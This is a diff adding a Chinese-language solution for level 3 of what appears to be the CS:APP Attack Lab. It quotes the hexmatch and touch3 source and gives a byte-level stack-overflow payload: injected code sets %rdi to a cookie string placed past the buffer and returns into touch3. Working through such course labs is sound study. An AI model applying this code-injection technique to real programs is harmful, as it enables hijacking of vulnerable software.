@@ -69,3 +69,55 @@
     
 
 
+* LEVEL3
+  * PREQUEST:
+    1. <heaxmatch>: 
+
+      int hexmatch(unsigned val, char *sval) {
+        char cbuf[110];
+
+        /* Make position of check string unpredictable */
+        char*s = cbuf + random() % 100;
+        sprintf(s, "%.8x", val);
+        return strncmp(sval, s, 9) == 0;
+      }
+
+    2. <touch3>:
+      
+      void touch3(char*sval) {
+        vlevel = 3;       
+
+        /* Part of validation protocol */
+        if (hexmatch(cookie, sval)) {
+          printf("Touch3!: You called touch3(\"%s\")\n", sval);
+          validate(3);
+        } else {
+          printf("Misfire: You called touch3(\"%s\")\n", sval);
+          fail(3);
+        }
+
+        exit(0);
+      }
+
+  * SOLVE:
+    1. 跳转要求和前面一致，不在阐述
+    2. <heaxmatch> 返回正确结果的前提是 sval 设置为和 cookie 等额 ASCII 表示数值的字符串(不带有前缀 0x)
+    3. 可通过 [./ctarget_dump_d] 可知，<heaxmatch> 的参数 sval 通过寄存器 %rdi 传输，故我们可以暂且明确
+    一个目标，要将 %rdi 设置为指向和 cookie 等额 ASCII 表示数值的字符串指针
+    4. 通过 gdb 调试时会发现，<heaxmatch> 会破坏掉原先由 <getbuf> 中所构造的缓冲区，故我们的字符串所指向
+    的地址不能在这个范围之内，由此得出: 
+
+      68 fa 18 40 00 48 c7 c7 
+      a8 dc 61 55 c3 00 00 00
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00
+      78 dc 61 55 00 00 00 00
+      35 39 62 39 39 37 66 61  <-- "59b997fa"; 将字符串放在这个位置是为了不然 <heaxmatch> 对其进行破坏;
+      00 00 00 00 00 00 00 00
+
+    其中，前两段的代码主要作用就是设置 %rdi 指向上述地址，并且设置 ret 返回为 <touch3>，这个思想和 LEVEL2
+    一致
+
+
+
